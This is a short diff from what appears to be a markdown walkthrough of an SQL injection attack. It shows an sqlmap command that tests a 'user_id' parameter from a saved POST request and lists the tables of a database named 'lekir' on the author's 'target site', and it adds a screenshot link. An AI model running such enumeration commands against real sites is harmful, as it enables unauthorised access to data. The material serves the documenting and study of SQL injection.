@@ -58,3 +58,5 @@ I can see that there is a database named lekir which refers to my target site. S
 `
 sqlmap -r post-request -p user_id -D lekir --tables
 `
+![image 7](./img/image7)
+
